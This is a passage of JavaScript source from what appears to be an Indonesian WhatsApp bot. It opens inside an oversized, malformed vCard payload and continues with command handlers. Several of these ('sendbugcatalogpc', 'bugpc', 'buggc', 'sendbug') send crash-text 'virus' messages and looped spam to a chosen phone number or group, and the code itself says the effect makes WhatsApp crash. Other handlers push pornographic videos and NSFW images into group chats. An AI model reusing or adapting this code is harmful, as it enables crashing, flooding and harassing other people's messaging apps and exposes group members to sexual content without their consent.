karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}
rikibos.sendContact(m.chat, global.ownerr, fkontaak)
}
break
case 'bugbokep':{
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
dwhe = await getBuffer(`https://raku-web.herokuapp.com/api/bokep?apikey=RakuKeyTod`)
rikibos.sendMessage(m.chat, { video: dwhe, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Nih Bokep Nya` }, { quoted: doc })
}
break
case 'bugsange': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfww) return m.reply('Sudah Aktif')
ntnsfww.push(from)
m.reply('Sukses Telah mengaktifkan Bug Sange Di group Ini')
var groupe = await rikibos.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
rikibos.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfww) return m.reply('Sudah Non Aktif')
let off = ntnsfww.indexOf(from)
ntnsfww.splice(off, 1)
m.reply('Sukses Mematikan Bug Sange di group ini')
} else {
let buttonsntnsfww = [
{ buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
{ buttonId: `${command} off`, buttonText: { displayText: 'Off' }, type: 1 }
]
await rikibos.sendButtonText(m.chat, buttonsntnsfww, `Klick Button Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan
\n\n*WELCOME\n\n
bugcrot
bugahay `, `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfww) return reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
 let bugcrotbot = [
 {buttonId: `bugcrot`, buttonText: {displayText: buttonvirus}, type: 1},
 ]
let button3Messagess = {
image: {url:waifudd.data.url},
caption:`𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
buttons: bugcrotbot,
headerType: 1
} 
 await rikibos.sendMessage(m.chat, button3Messagess, { quoted: doc }).catch(err => {
 return('Error!')
})
break
case 'bugahay' :
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfww) return reply(mess.nsfw)
reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 let bugahaybot = [
 {buttonId: `bugahay`, buttonText: {displayText: buttonvirus}, type: 1},
 ]
let button4Messagess = {
image: {url:waifudd.data.url},
caption:`𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
buttons: bugahaybot,
headerType: 1
} 
 await rikibos.sendMessage(m.chat, button4Messagess, { quoted: doc }).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'jadibug1': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
if (!isPrem) return replyPremium(mess.premium)

////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./rikilah/lib/converter')
let audio = await toAudio(media, 'mp4')
rikibos.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : doc })
}
break
//=================================================//
case 'jadibug2': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
if (!isPrem) return replyPremium(mess.premium)

////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (/document/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply Video/Audio You Want to Convert into MP3 With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./rikilah/lib/converter')
let audio = await toAudio(media, 'mp4')
rikibos.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${rikibos.user.name}.mp3`}, { quoted : doc})
}
break
//=================================================//
case 'jadibug3': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
//if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return 
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./rikilah/lib/converter')
let audio = await toPTT(media, 'mp4')
rikibos.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:doc})
}
break
//=================================================//
case 'jadibug4': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
if (!isPrem) return replyPremium(mess.premium)

if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await rikibos.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
rikibos.sendMessage(m.chat, { image: buffer }, { quoted: doc })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'jadibug5': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await rikibos.downloadAndSaveMediaMessage(quoted)
rikibos.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: doc })
} else if (/video/.test(mime)) {
anu = await rikibos.downloadAndSaveMediaMessage(quoted)
rikibos.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: doc })
}
}
break
//=================================================//
case 'permisi':
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
if (!isPrem) return replyPremium(mess.premium)

touchmebre = [
{
title: `🌷 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 🌷 ${buttonvirus} ${buttonvirus}`,
rows: [
{title: buttonvirus, rowId: `asu'+$+$+$+2+#`, description: `Haii bang`},
{title: buttonvirus, rowId: `!$(2!*($!$8_!#!#+$`, description: `Haii Anak" ganteng`}
]
}
]
rikibos.sendListMsg(m.chat, `🌷 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳 🌷`, rikibos.user.name, `Hi Kak Sc Bot Adia Di List`, `Click Here 🌷`, touchmebre, m)
break
//=================================================//
case 'bugrik': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
 mem = fs.readFileSync('./rikilah/sound/tes.mp3')
 rikibos.sendMessage(m.chat, {audio: mem, mimetype: 'audio/mpeg', ptt:true }, {quoted:kel})
 }
 break
case 'bughaha': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
 mom = fs.readFileSync('./rikilah/sound/ketawa.mp3')
 rikibos.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugahh': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
 mom = fs.readFileSync('./rikilah/sound/ahh.mp3')
 rikibos.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugohh': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
 mom = fs.readFileSync('./rikilah/sound/ohh.mp3')
 rikibos.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugngakak': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
 mim = fs.readFileSync('./rikilah/sound/ketawa.mp3')
 rikibos.sendMessage(m.chat, {audio: mim, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugwkwk': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
 mum = fs.readFileSync('./rikilah/sound/wkwk.mp3')
 rikibos.sendMessage(m.chat, {audio: mum, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugmusik': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
 mom = fs.readFileSync('./rikilah/sound/musik.mp3')
 rikibos.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugbang': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
 ah = fs.readFileSync('./rikilah/sound/bang.mp3')
 rikibos.sendMessage(m.chat, {audio: ah, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugnob': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
 eh = fs.readFileSync('./rikilah/sound/nob.mp3')
 rikibos.sendMessage(m.chat, {audio: eh, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugbot': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
if (!isPrem) return replyPremium(mess.premium)
 ih = fs.readFileSync('./rikilah/sound/ikehcok.mp3')
 rikibos.sendMessage(m.chat, {audio: ih, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugsuhu': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from)
if (!isPrem) return replyPremium(mess.premium)

 nyong = fs.readFileSync('./rikilah/sound/mastah.mp3')
 rikibos.sendMessage(m.chat, {audio: nyong, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugca': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
 ri = fs.readFileSync('./rikilah/sound/ikehcok.mp3')
 rikibos.sendMessage(m.chat, {audio: ri, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugwibu': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
 ru = fs.readFileSync('./rikilah/sound/loli.mp3')
 rikibos.sendMessage(m.chat, {audio: ru, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugkesel': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
 re = fs.readFileSync('./rikilah/sound/kesel.mp3')
 rikibos.sendMessage(m.chat, {audio: re, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugngeselin': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
 ro = fs.readFileSync('./rikilah/sound/ngeselin.mp3')
 rikibos.sendMessage(m.chat, {audio: ro, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
case 'bugsakit': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
 mom = fs.readFileSync('./rikilah/sound/sakit.mp3')
 rikibos.sendMessage(m.chat, {audio: mom, mimetype: 'audio/mpeg', ptt:true }, {quoted:doc})
 }
 break
//=================================================//
case 'bugvip':{
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
/*if (isBan) throw sticBanLu(from) Kalau Mau Self Hapus Aja yang Tanda*/ /* sama */
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
title: `SILAHKAN PILIH BUG NYA \n\n Name : ${pushname} ${ucapanWaktu}\n Number : ${m.sender.split('@')[0]}\n Status : ${isCreator ? 'Owner' : 'User'}`,
description: "PILIH DI DALAM LIST",
buttonText: "CLICK DISINI",
footerText: "",
listType: "SINGLE_SELECT",
sections: [{
"title": "LOADING",
"rows": [
{
"title": "bugrik",
"description": "Sukses ✓",
"rowId": `${prefix}bugrik`
}
]
},
{
"title": "LOADINGt",
"rows": [
{
"title": "bughaha",
"description": "Sukses ✓",
"rowId": `${prefix}bughaha`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "bugahh",
"description": "Sukses ✓",
"rowId": `${prefix}bugahh`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "bugohh",
"description": "Sukses ✓",
"rowId": `${prefix}bugohh`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "bugngakak",
"description": "Sukses ✓",
"rowId": `${prefix}bugngakak`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "bugwkwk",
"description": "Sukses ✓",
"rowId": `${prefix}bugwkwk`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "bugmusik",
"description": "Sukses ✓",
"rowId": `${prefix}bugmusik`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "bugbang",
"description": "Sukses ✓",
"rowId": `${prefix}bugbang`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "bugnob",
"description": "Sukses ✓",
"rowId": `${prefix}bugnob`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "bugbot",
"description": "Sukses ✓",
"rowId": `${prefix}bugbot`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "bugsuhu",
"description": "Sukses ✓",
"rowId": `${prefix}bugsuhu`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "bugca",
"description": "Sukses ✓",
"rowId": `${prefix}bugca`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "bugwibu",
"description": "Sukses ✓",
"rowId": `${prefix}bugwibu`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "bugkesel",
"description": "Sukses ✓",
"rowId": `${prefix}bugkesel`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "bugngeselin",
"description": "Sukses ✓",
"rowId": `${prefix}bugngeselin`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "bugsakit",
"description": "Sukses ✓",
"rowId": `${prefix}bugsakit`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "Bug Vn",
"description": "Sukses ✓",
"rowId": `${prefix}bu`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "Bug Vn",
"description": "Sukses ✓",
"rowId": `${prefix}bi`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "Bug Vn",
"description": "Sukses ✓",
"rowId": `${prefix}ca`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "Bug Vn",
"description": "Sukses ✓",
"rowId": `${prefix}ci`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "Bug Vn",
"description": "Sukses ✓",
"rowId": `${prefix}cu`
}
]
},
{
"title": "LOADING",
"rows": [
{
"title": "Bug Vn",
"description": "Sukses ✓",
"rowId": `${prefix}co`
}
]
},
],
listType: 1
}
}), { userJid: m.chat, quoted: doc })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
case 'bugrow': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
description: "PERINGATAN!!!",
 buttonText: 'LIST MENU',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex6(prefix)}`,
listType: "SINGLE_SELECT",
sections: [{
"title": "MENU VIRUS",
"rows": [
{
"title": "ACIEEEEE",
"description": "ULTAH CIEEEE",
"rowId": ""
}
]
}
],
listType: 1
}
}), { userJid: m.chat, quoted: trolii })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'sendbugcatalogpc': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(mess.ban)
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
var messa = await prepareWAMessageMedia({ image: log0 }, { upload: rikibos.waUploadToServer })
var catalog = generateWAMessageFromContent(num, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "7091718154232528",
"title": `Tes doang kak`,
"description": `${virtex6}`,
"currencyCode": "IDR",
"priceAmount1000": "100000000000000000",
"productImageCount": 1,
"firstImageId": 1,
"salePriceAmount1000": "1000",
"retailerId": `Nomor Owner Di Atas`,
"url": `https://wa.me/6287741097274`
},
"businessOwnerJid": "6287741097274@s.whatsapp.net",
}
}), { userJid: m.chat, quoted: lep  })
rikibos.relayMessage(num, catalog.message, { messageId: catalog.key.id })
await sleep(ms(waktu))
}
reply(`SUKSES MAS BRO`)
}
break
case 'bugpc2': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(mess.ban)
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
rikibos.sendMessage(num, { sticker: thumb }, { quoted: lep})
await sleep(ms(waktu))
}
tek = `Sukses Kirim Bug To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
reply(tek)
}
break
case 'bugpc': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(mess.ban)
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} number|amount spam|timer\nExample : ${command} 62888|1|10s\n\n\ns = Second/Detik`)
num = q.split('|')[0]+'@s.whatsapp.net'
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
rikibos.sendMessage(num, { text: '☛ 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳' }, { quoted: lep})
await sleep(ms(waktu))
}
tek = `Sukses Kirim Bug To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
reply(tek)
}
break
case 'buggc': {
if (!isRegistered) return replyReg(mess.verif)
if (isBan) return reply(mess.ban)
if (!isCreator) return reply(mess.owner)
if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
num = q.split('|')[0]
jumlah = q.split('|')[1]
waktu = q.split('|')[2]
for (let i = 0; i < jumlah; i++) {
rikibos.sendMessage(num, { text: 'Halo Guys Aku 𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳' }, { quoted: lep})
await sleep(ms(waktu))
}
tekteka = `Sukses Kirim Bug To: ${num}\nAmount Spam: ${jumlah}\nTimer: ${waktu}`
reply(tekteka)
}
break
case 'sendbug':{
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
/*if (!isRegistered) return replyReg(mess.verif)
if (isBan) throw sticBanLu(from) Kalau Mau Self Hapus Aja yang Tanda*/ /* sama */
let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
listMessage :{
title: `Silahkan Pilih Bug Yang Anda Inginkan \n\n Name : ${pushname} ${ucapanWaktu}\n Number : ${m.sender.split('@')[0]}\n Status : ${isCreator ? 'Owner' : 'User'}`,
description: "PERINGATAN!!!",
buttonText: "CLICK DISINI",
footerText: "EFFECT INI MEMBUAT WHATSAPP MENJADI CRASH",
listType: "SINGLE_SELECT",
sections: [{
"title": "MENU VIRUS",
"rows": [
{
"title": "GAMBAR",
"description": "Bug Berjenis Quoted Gambar",
"rowId": `${prefix}bug1`
}
]
},
{
"title": "MENU VIRUS",
"rows": [
{
"title": "LOKASI",
"description": "Bug Berjenis Lokasi",
"rowId": `${prefix}bug2`
}
]
},
{
"title": "MENU VIRUS",
"rows": [
{
"title": "KATALOG",
"description": "Bug Berjenis Troli",
"rowId": `${prefix}bug3`
}
]
},
{
"title": "MENU VIRUS",
"rows": [
{
"title": "AUDIO",
"description": "Bug Berjenis Audio",
"rowId": `${prefix}bug4`
}
]
},
{
"title": "MENU VIRUS",
"rows": [
{
"title": "GRUP",
"description": "Bug Berjenis Group",
"rowId": `${prefix}bug5`
}
]
},
{
"title": "MENU VIRUS",
"rows": [
{
"title": "KONTAK",
"description": "Bug Berjenis Contact",
"rowId": `${prefix}bug6`
}
]
},
{
"title": "MENU VIRUS",
"rows": [
{
"title": "DOKUMEN",
"description": "Bug Berjenis Dokumen",
"rowId": `${prefix}bug7`
}
]
}
],
listType: 1
}
}), { userJid: m.chat, quoted: doc })
rikibos.relayMessage(m.chat, template.message, { messageId: template.key.id })
}
break
//=================================================//
case 'inspect': {
if (isBan) throw sticBanLu(from)
if (!args[0]) return m.reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return m.reply("Link Invalid")
rikibos.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Inspector 」
▸ ID : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}
▸ Subject : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}
▸ Subject update by : ${res.content[0].attrs.s_o.split("@")[0] ? "@" + res.content[0].attrs.s_o.split("@")[0] : "undefined"}
▸ Subject update at : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Create by : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Create at : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Members : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Members
▸ Desc update by : ${res.content[0].content[0].attrs.participant ? "@" + res.content[0].content[0].attrs.participant.split("@")[0] : "undefined"}
